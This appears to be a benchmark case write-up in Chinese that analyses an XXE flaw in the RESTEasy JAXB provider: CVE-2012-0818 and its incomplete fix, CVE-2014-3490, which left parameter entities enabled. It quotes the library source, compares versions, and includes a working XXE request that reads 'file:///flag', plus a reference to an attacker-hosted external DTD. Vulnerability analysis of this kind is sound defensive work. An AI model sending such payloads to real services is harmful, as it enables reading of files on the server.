# RESTEasy：关掉了外部一般实体，参数实体开关还是开的

- Case：`PCBV2-0185`
- 产品：RESTEasy JAXB provider（JBoss / Maven `resteasy-jaxb-provider`）。运行时是 Maven Central 的 2.3.0.GA / 3.0.8.Final / 3.0.9.Final，打进 WAR，由 Tomcat 上的 JAX-RS 资源 `POST /app/xml`（`application/xml`）走真实 `AbstractJAXBProvider.readFrom`。
- 链：CVE-2012-0818（&lt;2.3.1 裸 unmarshal → `ExternalEntityUnmarshaller` 设 `external-general-entities=false`）→ CVE-2014-3490（3.0.8 → 3.0.9 / RESTEASY-1073，补上 `external-parameter-entities=false`）
- 源码对着 tag `3.0.8.Final` 的 `ExternalEntityUnmarshaller.java`、`AbstractJAXBProvider.java`，以及 `3.0.9.Final` 的 `SecureUnmarshaller.configureParserFactory`。金丝雀是容器内 `/flag`（webapp 外），XXE 读出后进 JAXB `@XmlValue`，出现在 HTTP 响应。

NVD CVE-2014-3490：*RESTEasy 2.3.1 before 2.3.8.SP2 and 3.x before 3.0.9 ... does not disable external entities when the resteasy.document.expand.entity.references parameter is set to false ... NOTE: this vulnerability exists because of an incomplete fix for CVE-2012-0818.* Red Hat Bugzilla 1107901 更具体：一般实体关了，**参数实体**没关。

根因不只是「漏了一个 SAX feature」。检查插在 `XMLReader.setFeature(external-general-entities, false)` 上；真正解析 DOCTYPE / 拉外部 DTD 的是同一个 SAX 解析器，参数实体默认仍为 true。下面按 HTTP 走进去。

---

## 这块功能本来在干什么

JAX-RS 资源声明 `@Consumes("application/xml")` 时，RESTEasy 的 JAXB provider 把 body 解成 `@XmlRootElement` bean。`resteasy.document.expand.entity.references=false`（本 case web.xml 已设）时，3.0.8 走「关掉外部实体再 unmarshal」的包装器。

一次典型请求：

```http
POST /app/xml
Content-Type: application/xml

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<foo>&xxe;</foo>
```

`AbstractJAXBProvider.readFrom`：

```java
// AbstractJAXBProvider.java  (3.0.8.Final)
        if (suppressExpandEntityExpansion())
        {
           return processWithoutEntityExpansion(unmarshaller, entityStream);
        }
        return (T) unmarshaller.unmarshal(new StreamSource(entityStream));
```

```java
   protected T processWithoutEntityExpansion(Unmarshaller unmarshaller, InputStream entityStream) throws JAXBException
   {
      unmarshaller = new ExternalEntityUnmarshaller(unmarshaller);
      return (T) unmarshaller.unmarshal(entityStream);
   }
```

设计意图：context-param 为 false 时，XML 不得把外部文件读进 bean。成功穿越之后的效果是：**解析器仍解析参数实体，外部 DTD 里定义的一般实体把 `/flag` 填进元素文本，响应 body 出现 `PCBFLAG_...`。**

不需要登录。谁能对 JAX-RS 端点 POST XML，谁就能驱动 unmarshal。

数据流：

```text
POST application/xml
    → HttpServletDispatcher → XmlResource
    → AbstractJAXBProvider.readFrom
         expand.entity.references=false
         ExternalEntityUnmarshaller.unmarshal(InputSource)
              SAXParser → XMLReader
              setFeature(external-general-entities, false)     ← 2012-0818
              （3.0.8 不设 external-parameter-entities）
              delegate.unmarshal(SAXSource)
         JAXB 把元素文本放进 @XmlValue
    → HTTP 响应返回该字符串
```

---

## 原始漏洞：外部一般实体直接展开（CVE-2012-0818，2.3.0.GA）

2.3.0 没有 `ExternalEntityUnmarshaller`。`readFrom` 对 `StreamSource` 直接 `unmarshaller.unmarshal`。Xerces 默认展开外部一般实体。

NVD CVE-2012-0818：*RESTEasy before 2.3.1 allows remote attackers to read arbitrary files via an external entity reference in a DOM document.* RESTEASY-637 / RHSA-2012-0441。

seed（内部子集里的一般实体）：

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<foo>&xxe;</foo>
```

2.3.0 上 `&xxe;` 变成文件内容，bean 值进响应。这就是 v0 + `--seed`。

---

## 维护者改了什么（CVE-2012-0818 修复，至 3.0.8 仍如此）

2.3.1 起，在 `expand.entity.references=false` 时用 `ExternalEntityUnmarshaller` 包一层 SAX。3.0.8.Final 的 `unmarshal(InputSource)`：

```java
// ExternalEntityUnmarshaller.java  (3.0.8.Final)
         XMLReader xmlReader = sp.getXMLReader();
         xmlReader.setFeature("http://xml.org/sax/features/validation", false);
         xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
         xmlReader.setFeature("http://xml.org/sax/features/namespaces", true);
         SAXSource saxSource = new SAXSource(xmlReader, source);
         return delegate.unmarshal(saxSource);
```

`unmarshal(Source, Class)` 同样只关 general，不关 parameter。注释写 *Turns off expansion of external entities*，代码只关了一类。

SAX 规范里两类外部实体是独立 feature：

| feature | 控制什么 | 3.0.8 |
|---|---|---|
| `external-general-entities` | `&xxe;` 这种一般实体是否向外交 | **false** |
| `external-parameter-entities` | DTD 里 `%pe;` 是否向外交 | **未设，默认 true** |

seed 的 `&xxe;` 是一般实体，V1 拒绝展开（实体未声明或值为空，flag 不进 body）。这就是 v1 + `--seed` 退出码 10。

补丁默认：关掉 general 就等于「外部实体都关了」。参数实体可以在**外部 DTD** 里声明一般实体；内部子集里 XML 禁止用参数实体给一般实体「换马」，所以残余需要一份攻击者可取的外部 DTD（本 case 由评测机在 gateway 上提供，DTD **不含**秘密，秘密仍是本地 `file:///flag`）。

---

## 消毒之后，谁还在解析 DTD

`setFeature` 之后，同一个 `xmlReader` 交给 `delegate.unmarshal`。JAXB / Xerces 继续处理 DOCTYPE：

- 一般实体：feature=false，`SYSTEM "file:///flag"` 的 `&xxe;` 不展开
- 参数实体：feature 未关，`<!DOCTYPE foo SYSTEM "http://attacker/xxe.dtd">` 会把外部 DTD 拉下来；DTD 里 `%file;` 可以定义将要被文档引用的一般实体

过滤器看的是 general 开关。消费者是解析器对 **parameter** 的默认 true。检查通过（general 已关）之后没有第二次「禁止 DTD / 禁止外部参数实体」——3.0.8 也没有 `disallow-doctype-decl`。

`unmarshal(Node)` 直接 `delegate.unmarshal(node)`，连 general 都不设。本 case HTTP 路径走 `InputStream` → `InputSource`，是设了 feature 的那条。

`suppressExpandEntityExpansion()` 只是 `!expandEntityReferences`。web.xml 把 `resteasy.document.expand.entity.references` 设成 false 之后，3.0.8 **一定会** 进 `ExternalEntityUnmarshaller`。调用方没法在不改 RESTEasy 的前提下给这个包装器补上 parameter feature。缺口在 provider 内部，不在应用有没有设那个 context-param。

---

## 仓库里已经有更强的开关，3.0.8 没用

同一份 SAX API 上，`external-parameter-entities` 与 general 并列，2.3.1 写 general 那一行时就可以顺手写上。3.0.9 的 `SecureUnmarshaller.configureParserFactory` 证明维护者知道这两个 feature 要一起关：

```java
// SecureUnmarshaller.java  (3.0.9.Final)
      factory.setFeature("http://xml.org/sax/features/external-general-entities", !disableExternalEntities);
      factory.setFeature("http://xml.org/sax/features/external-parameter-entities", !disableExternalEntities);
      factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, enableSecureProcessingFeature);
      factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", disableDTDs);
```

3.0.8 的 jar **没有** `SecureUnmarshaller` 这个类。V1 等于只拨了四个 feature 里的 general。不是 Xerces 没有 parameter 开关，是 **ExternalEntityUnmarshaller 没拨**。

`FEATURE_SECURE_PROCESSING` 和 `disallow-doctype-decl` 更强：后者直接禁止 DOCTYPE。3.0.9 默认 `disableDTDs=true`。本 case 在 V2 上把 `resteasy.document.secure.disableDTDs=false`，用来证明残余是被 `external-parameter-entities=false` 挡住的（观察到 *The entity 'send' was referenced, but not declared*），而不是被「禁止 DOCTYPE」掩掉。

---

## 这个补丁挡住了什么、没挡住什么

- `external-general-entities=false`：看内部子集里的 `&entity;` 会不会去 `SYSTEM` URI
- 默认 `external-parameter-entities=true`：看 `%pe;` / 外部 DTD 会不会再声明一般实体并展开

只要把「读 `/flag`」放到外部 DTD 的参数实体链上，第一行放行，解析器仍出站取 DTD、再读本地文件。Red Hat 对 1107901 / CVE-2014-3490 的描述就是这条。

残余形状（结构，不是可复制 exploit 手册）：文档声明外部 DTD；DTD 用参数实体定义一个一般实体，其值为 `file:///flag`；文档元素引用该一般实体。XML 不允许在内部子集里完成「参数实体重定义一般实体」的把戏，所以 DTD 必须在外部——评测里 DTD 是无秘密的 fixture。

平台 seed 和残余是 **同一 unmarshal sink**（`ExternalEntityUnmarshaller` → JAXB bean → HTTP body），换的是实体种类（general vs parameter），不是换了一个 JAX-RS 方法。

---

## 残余仍然走 POST /app/xml 的 JAXB unmarshal（CVE-2014-3490）

没有换资源类、没有换 `expand.entity.references=false`。还是 `readFrom` → `ExternalEntityUnmarshaller.unmarshal`。V1 的 general 开关照样是 false；参数实体把 `/flag` 填进 `@XmlValue`；响应里出现 `PCBFLAG_...`。

这与 NVD「incomplete fix for CVE-2012-0818」同一条链。

内部子集里的参数实体不能用来重定义一般实体（XML 规范对内部子集的限制）。所以「general=false 之后仍要读文件」必须把声明放到外部 DTD。评测机在 host-gateway 上提供那份 DTD，角色是「攻击者的 HTTP 文件」，不是另一条 RESTEasy 漏洞。秘密始终是 `file:///flag` 的本地读，响应仍是 in-band 的 JAXB 字段。

3.0.8 两处 `unmarshal` 的 feature 列表并排：

```text
validation                = false
external-general-entities = false     ← 0818
namespaces                = true
external-parameter-entities           ← 缺席
FEATURE_SECURE_PROCESSING             ← 缺席
disallow-doctype-decl                 ← 缺席
```

缺席不是「显式允许」，是实现默认。Xerces 上 parameter 默认为 true，DOCTYPE 默认可解析。0818 的 diff 只加了 general 那一行，所以 3.0.x 直到 3.0.8 都带着这个缺席。

`processWithoutEntityExpansion` 的名字比行为宽：它只构造 `ExternalEntityUnmarshaller`。3.0.8 上这个名字不能读成「所有外部实体都关了」。

HTTP 入口不变：`@Consumes("application/xml")` 的 `readFrom` 在 V0 直接 unmarshal，在 V1 包一层只关 general 的 SAX，在 V2 包一层连 parameter 都关的 SecureUnmarshaller。应用资源类 `pcb.XmlResource` 三版相同，差分全在 RESTEasy JAXB provider 构件。

---

## 后来又补了什么（CVE-2014-3490，3.0.9.Final）

RESTEASY-1073 / commit `9b7d0f574cafdcf3bea5428f3145ab4908fc6d83` 在 2.3 线给 `ExternalEntityUnmarshaller` 两处 `unmarshal` 都加上 `external-parameter-entities=false`。3.0.9 则换成 `SecureUnmarshaller`：`needsSecurity()` 恒真，`disableExternalEntities` 默认 true，于是 general **和** parameter 都是 false，并默认 `disallow-doctype-decl`。

对残余：参数实体不展开，DTD 里声明的一般实体对文档不可见，unmarshal 失败或值为空，body 里没有 flag。公开建议升到 3.0.9.Final / 2.3.8.SP2（RHSA-2014-1011 等）。

3.0.9 的 `disableExternalEntities` 默认 true，于是 `!disableExternalEntities` 把两个 SAX feature 都拨成 false。应用若把 `resteasy.document.expand.entity.references` 设回 true，SecureUnmarshaller 仍可能按开关打开外部实体——那是配置回退，不是 3490 残余。本 case V1/V2 都保持 expand=false，差别只在 parameter feature 有没有被拨。

即便关掉 parameter，若调用方把 `disableDTDs` 设回 false 且又打开 `disableExternalEntities` 的反相，需要另证。本 case V2 故意允许 DOCTYPE，只靠 parameter=false 闭合 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是「一般实体」这一个 SAX feature。真正还能出站的是参数实体和外部 DTD。V2 在 3.0 线换成 SecureUnmarshaller，一次拨齐四项；2.3 线仍在原类上补那一行。

**不是没有更好的谓词。**  
`external-parameter-entities` 与 general 写在同一份 SAX 文档里。从 3.0.8 的源码只能看到 general=false；要判断是否闭合，必须对照 SAX 默认值和参数实体 XXE 的经典结构。

**同一 `XMLReader`、同一 `unmarshal`，只换实体类别。**  
seed 用内部子集一般实体；残余用外部 DTD + 参数实体。`readFrom` 入口不变。

**注释比代码宽。**  
*Turns off expansion of external entities* 覆盖不了未设置的那个 feature。安全开关漏设等于保持实现默认（Xerces：parameter 为 true）。

**金丝雀在 webapp 外是有意的。**  
`/flag` 不是 classpath 资源。能出现在 JAXB 字段里，说明解析器做了 `file://` 读取，不是 harness 把 flag 写进响应。

**3.0.9 默认 `disallow-doctype-decl=true` 会掩掉 residual。**  
若评测不把 `resteasy.document.secure.disableDTDs` 打成 false，V2 可能因「根本不接受 DOCTYPE」而挡，看起来像 2014-3490 已修，实际测到的是另一道更宽的门。本 case 显式允许 DOCTYPE，把闭合归因到 `external-parameter-entities=false`。

**2.3 线与 3.0 线的 V2 形态不同。**  
NVD 写 2.3.8.SP2 和 3.0.9。前者在原 `ExternalEntityUnmarshaller` 上加一行；后者换类。本 case V1/V2 走 3.0.8 → 3.0.9，以 Maven 构件为准。

---

## 版本、入口、参考

| | 构件 | 包装器 | general | parameter | 一般实体 seed | 参数实体 residual |
|---|---|---|---|---|---|---|
| V0 | 2.3.0.GA | 无，直接 unmarshal | 默认开 | 默认开 | 读到 `/flag` | （开着） |
| V1 | 3.0.8.Final | `ExternalEntityUnmarshaller` | **false** | **未设（开）** | 不展开 | 读到 `/flag` |
| V2 | 3.0.9.Final | `SecureUnmarshaller` | false | **false** | 挡 | 实体未声明，挡 |

- 产品路径：`POST /app/xml` `Content-Type: application/xml` → RESTEasy JAXB `readFrom`
- [CVE-2012-0818](https://nvd.nist.gov/vuln/detail/CVE-2012-0818)、[RESTEASY-637](https://issues.jboss.org/browse/RESTEASY-637)、[Bugzilla 785631](https://bugzilla.redhat.com/show_bug.cgi?id=785631)
- [CVE-2014-3490](https://nvd.nist.gov/vuln/detail/CVE-2014-3490)、[RESTEASY-1073](https://issues.jboss.org/browse/RESTEASY-1073)、RHSA-2014-1011
- V1 blob：[`ExternalEntityUnmarshaller.java@3.0.8.Final`](https://github.com/resteasy/Resteasy/blob/3.0.8.Final/jaxrs/providers/jaxb/src/main/java/org/jboss/resteasy/plugins/providers/jaxb/ExternalEntityUnmarshaller.java)、[`AbstractJAXBProvider.java@3.0.8.Final`](https://github.com/resteasy/Resteasy/blob/3.0.8.Final/jaxrs/providers/jaxb/src/main/java/org/jboss/resteasy/plugins/providers/jaxb/AbstractJAXBProvider.java)
- V2：[`SecureUnmarshaller.java@3.0.9.Final`](https://github.com/resteasy/Resteasy/blob/3.0.9.Final/jaxrs/providers/jaxb/src/main/java/org/jboss/resteasy/plugins/providers/jaxb/SecureUnmarshaller.java)；补丁 commit [`9b7d0f57`](https://github.com/ronsigal/Resteasy/commit/9b7d0f574cafdcf3bea5428f3145ab4908fc6d83)
